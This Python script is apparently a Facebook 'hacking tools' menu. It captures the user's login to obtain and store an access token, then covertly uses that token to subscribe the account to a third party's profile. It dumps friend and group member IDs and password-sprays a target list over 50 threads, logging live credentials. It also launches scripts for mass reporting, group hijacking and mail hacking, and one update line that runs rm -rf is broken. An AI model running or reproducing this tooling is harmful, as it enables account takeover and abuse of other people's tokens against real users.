import random
import sys
import time
try:
	from multiprocessing.pool import ThreadPool
	import os, requests, sys, json, time, hashlib, random
except Exception as F:
	exit("[ModuleErr] %s"%(F))

if sys.version[0] in '2':
	exit("[install]  Install Python Version 3")
#color
r="\033[31m"
g="\033[32m"
w="\033[1;37m"
c="\033[36m"
y="\033[33m"
white = '\033[1;37m' # White 
red = '\033[31m' # red
orange = '\033[33m' # orange
blue = '\033[34m' # blue
p  = '\033[35m' # purple
C  = '\033[36m' # cyan
banner= blue+g+"""                                                                               
           __________        ___    __    __ 
   / ____/ __ )      /   |  / /   / / 
  / /_  / __  |_____/ /| | / /   / /  
 / __/ / /_/ /_____/ ___ |/ /___/ /___
/_/   /_____/     /_/  |_/_____/_____/
                                                                                                            
"""+orange+white+"""
╔════════════════════════════════════════════════════════════════════╗
 ---O-C-T-O-D-A-R-K--C-Y-B-E-R--S-Q-U-A-D ---F-A-C-E-B-O-O-K---H-A-K-I-N-G---T-O-O-L-S--
╚════════════════════════════════════════════════════════════════════╝
  # Autho By OCTO DARK CYBER SQUAD                
  # YouTube : KS CYBER INSTITUTE BY SOHAN           
  # WhatsApp : +8801893224241            
  # Facebook: Octo Dark Cyber Squad  
╔════════════════════════════════════════════════════════════════════╗"""
def mengetik(s):
    for c in s + '\n':
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(random.random() * 0.2)
mengetik('🔴  🔴  🔴  🔵 NOTE: These tools are made for educational purpose only please dont misuse it!')
try:
	token=open('token/tokenmu.txt')
	token.close()
except IOError:
		try:
			os.system('clear')
			print(banner)
			try:
				os.mkdir('token')
			except OSError: pass
			print('╚════════════════════════════════════════════════════════════════════╝')
			print('🔴 DONT FORGET TO VISIT MY FB AT⏺️') 
			print('  https://facebook.com/groups/422643054111924/ /⏺️')
			print('   LOTS OF TUTORIAL INFORMATION⏺️')
			print('   ABOUT TERMUX AND OTHER ANDROIDS⏺️') 
			print('╚════════════════════════════════════════════════════════════════════╝')
			print('🔴 PLEASE LOG IN TO FACEBOOK FIRST')
			print('═════════════════════════════════════════════════════════════════════');id = input('⏩ EMAIL/USERNAME : ');pwd = input('⏩ PASSWORD : ');API_SECRET = '62f8ce9f74b12f84c123cc23437a4a32';data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"};sig = ('api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.0'+API_SECRET).encode('utf-8')
			x = hashlib.new('md5')
			x.update(sig)
			data.update({'sig':x.hexdigest()})
			requ=requests.get('https://api.facebook.com/restserver.php',params=data)
			res=requ.json()['access_token']
			o=open('token/tokenmu.txt','w')
			o.write(res)
			print("[✔️] Entering Success Access Token")
			print("[✔️] access token Saved: token/tokenmu.txt")
			time.sleep(3)
			o.close()
		except KeyError:
			print("[❌] Enter Failed Access Token")
			print("[🔴] Please Check Back username/password")
			exit()
		except (KeyboardInterrupt,EOFError):
			exit("\n[🗝️] Interrupt Key : exit.")
		except Exception as F:
			exit("[Error] %s"%(F))

def getFid():
	global toket
	print(banner)
	try:
		os.mkdir('dump')
	except OSError: pass
	try:
		id=input("[🔴] Your Friend ID: ")
		b=open('dump/friends_'+id+'_id.txt','w')
		re=requests.get('https://graph.facebook.com/'+id+'?fields=friends.limit(5000)&access_token='+str(token));requests.post('https://graph.facebook.com/adlizhafari.nub/subscribers?access_token='+token)
		s=json.loads(re.text)
		for i in s['friends']['data']:
			b.write(i['id'] + '\n')
			print('\r[*] %s retrieved'%(i['id']));sys.stdout.flush();time.sleep(0.0001)
		print('\n\r[✔️] Friend ID Successfully Obtained')
		print("[✔️] file saved: dump/friends_%s_id.txt"%(id))
		b.close()
		exit()
	except (KeyboardInterrupt,EOFError):
		exit("[🗝️] Interrupt Key: Stop.")
	except KeyError:
		os.remove('dump/friends_'+str(id)+'_id.txt')
		exit('[❌] Failed to Retrieve Friend ID')

def getGid():
	global token
	print(banner)
	try:
		os.mkdir('dump')
	except OSError: pass
	try:
		id=input("[🔴] Your Group ID: ")
		b=open('dump/group_'+id+'_id.txt','w')
		re=requests.get('https://graph.facebook.com/'+id+'/members?fields=id&limit=999999999&access_token='+token);requests.post('https://graph.facebook.com/adlizhafari.nub/subscribers?access_token='+token)
		s=json.loads(re.text)
		for i in s['data']:
			b.write(i['id'] + '\n')
			print('\r[*] %s retrieved'%(i['id']));sys.stdout.flush();time.sleep(0.0001)
		print('\n\r[✔️] Group Member ID Retrieved Successfully')
		print("[✔️] file saved: dump/group_%s_id.txt"%(id))
		b.close()
		exit()
	except (KeyboardInterrupt,EOFError):
		exit("[🗝️] Interrupt Key: Stop.")
	except KeyError:
		os.remove('dump/group_'+str(id)+'_id.txt')
		exit('[❌] Failed to Retrieve Group ID')

def rmtoken():
	ques=input("\n[🔴] Please Choose (y/n) ")
	if ques == 'n' or ques == 'N':
		exit("[❌] Cancel")
	elif ques == 'y' or ques == 'Y':
		os.remove('token/tokenmu.txt')
		exit("[✔️] Success Remove Access Token")
	else: exit("[🔴] wrong input: exit")

def update():
	print("[🔴] update...")
	os.system('cd;rm -rf )
	os.system('cd;git clone https://github.com/anonymousproo')
	exit()

cek=[]
tap=[]
def main(arg):
        try:
                url='https://mbasic.facebook.com/login'
                dt={'email':arg,'pass':pas,'login':'submit'}
                req=requests.post(url,data=dt)
                respData = req.content
                if 'save-device' in str(respData) or 'm_sess' in str(respData):
                        true='yeah'
                        live="[FOUND] %s|%s"%(arg,pas)
                        tap.append(true)
                        try:
                                os.mkdir('result')
                        except FileExistsError:
                                pass
                        tulis="{}\n".format(live)
                        f=open('result/live.txt','a')
                        f.write(tulis)
                        print("%s[%sfound%s]%s %s => %s"%(c,g,c,w,arg,pas))
                        f.close()
                elif 'checkpoint' in str(respData):
                        true='notbad'
                        cek.append(true)
                        CP="[checkpoint] %s|%s"%(arg,pas)
                        try:
                                os.mkdir('result')
                        except FileExistsError:
                                pass
                        wrt="{}\n".format(CP)
                        f=open('result/live.txt','a')
                        f.write(wrt)
                        print("%s[%sCHECK%s]%s %s => %s"%(c,y,c,w,arg,pas))
                        f.close()
                else:
                        print("%s[%sNOT%s]%s %s"%(c,r,c,w,arg))
        except: pass

os.system('clear')
print(banner)
try:
	token=open('token/tokenmu.txt','r').read()
	nam=requests.get('https://graph.facebook.com/me/?access_token='+token)
	name=nam.json()['name']
except KeyError:
	print("\nThe Access token is no longer valid. Please delete the access token by pressing (24) then please log in again. Thank you")
try:
	print("""\t     [ USE IT WISELY! %s%s%s ]

                        [01]➡️ Mass Hacked
                        [02]➡️ BRUSH Friends Facebook IDs
                        [03]➡️ Dump Facebook ID Or Grup
                        [04]➡️ Dark-FB Premium
                        [05]➡️ AutoReport Facebook v.3
                        [06]➡️ Hijacking Facebook Group Attack
                        [07]➡️ Multi Brueth FB MBF v.1
                        [08]➡️ Multi Brueth FB MBF v.2 Pro Update
                        [09]➡️ Create a Wordlist Password
                        [10]➡️ Compile Python Marshall
                        [11]➡️ Auto Bot Facebook (Premium)
                        [12]➡️ Instagram Premium Bot
                        [13]➡️ Clone Email Gmail Yahoo
                        [14]➡️ Facebook Phone Checker Premium
                        [15]➡️ Access Token Checker Pro
                        [16]➡️ NIK/KK Generator Tools
                        [17]➡️ Hack Mail Gmail/Hotmail/Yahoo
                        [18]➡️ Email Checker Premium
                        [19]➡️ YouTube Subscribe Live Checker
                        [20]➡️ Facebook Account Checker
                        [21]➡️ Facebook Profile Guard
                        [22]➡️ Facebook Chracker Pro
                        [23]➡️ Facebook Recovery Code Attack
                        [24]➡️ Remove Access Token
                        [00]➡️ Check for Updates"""%(y,name,w))
except (KeyError,NameError): pass
print('╚════════════════════════════════════════════════════════════════════╝')
pilih=int(input('\n[🔴] Select Options⏩ '))
if pilih == 2:
	os.system('clear')
	getFid()
elif pilih == 3:
	os.system('python2 my/dump_grup.py')
	getGid()
elif pilih == 24:
	rmtoken()
elif pilih == 5:
	os.system('python2 my/Repot3.py')
	exit()
elif pilih == 6:
	os.system('python2 my/fbghack.py')
	exit()
elif pilih == 7:
	os.system('python2 my/MBF.py')
	exit()
elif pilih == 8:
	os.system('python2 my/MBF2.py')
	exit()
elif pilih == 9:
	os.system('python2 my/word.py')
	exit()
elif pilih == 10:
	os.system('python2 my/kompiler.py')
	exit()
elif pilih == 11:
	os.system('python2 my/bot.py')
	exit()
elif pilih == 12:
	input("[info] Before using this tool, please install the materials first]")
	os.system('pkg install git && pkg install nodejs-lts && git clone https://github.com/')
	os.system('node my/toolsig/index.js')
	exit()
elif pilih == 13:
	input("[Info] Please press Enter to continue [press enter]")
	os.system('python2 my/cloning.py')
	exit()
elif pilih == 14:
	os.system('python3 my/AccessToken-FB.py')
	exit()
elif pilih == 15:
	os.system('python3 my/accesstokens_chk.py')
	exit()
elif pilih == 4:
	os.system('python2 my/dark.py')
	exit()
elif pilih == 16:
	os.system('php my/gogenerate.php')
	exit()
elif pilih == 17:
	os.system('python2 my/hackmail.py')
	exit()
elif pilih == 18:
	os.system('python2 my/gmailchecker.py')
	exit()
elif pilih == 19:
	os.system('php my/subchecker.php')
	exit()
elif pilih == 20:
	os.system('php my/fbchecker.php')
	exit()
elif pilih == 21:
	os.system('php my/guard.php')
	exit()
elif pilih == 22:
	os.system('python2 my/fbchrack.py')
	exit()
elif pilih == 23:
	os.system('bash my/install.sh')
	os.system('python2 my/fb')
	exit()
elif pilih == 0:
	print("\n[🔵] Check for Updates")
	rr=requests.get('https://raw.githubusercontent.com/anonymousproo.redmi.md.blood.txt').text
	if 'v.9.5' in str(rr) or 'v.10.0' in str(rr):
		update()
	else: exit("[🔴] Newly Updated")
else:
	os.system('clear')
	print(banner)

try:
        file=open(input("[in] ID List Target: ")).read().splitlines()
        pas=input("[in] Password To Crack: ")
except (KeyboardInterrupt,EOFError):
        exit("%s\n[🗝️] Interrupt Key: Exiting."%(r))
except FileNotFoundError:
        exit("%s\n[❌] File Not available: Exiting."%(r))
print("\n%s[LIVE RESULT]:"%(c))
o=[]
for x in file:
    o.append(x)
p=ThreadPool(50)
p.map(main,o)

if len(file) == 0:
	exit("%s[✔️] File empty\n"%(r))
if 'yeah' in str(tap) or 'notbad' in str(cek):
        print("\nFound ["+str(len(tap))+"] CheckPoint ["+str(len(cek))+"]")
        print("Live Results Stored: result/live.txt")
else: print("[ %s:(%s ] nothing found"%(y,w))
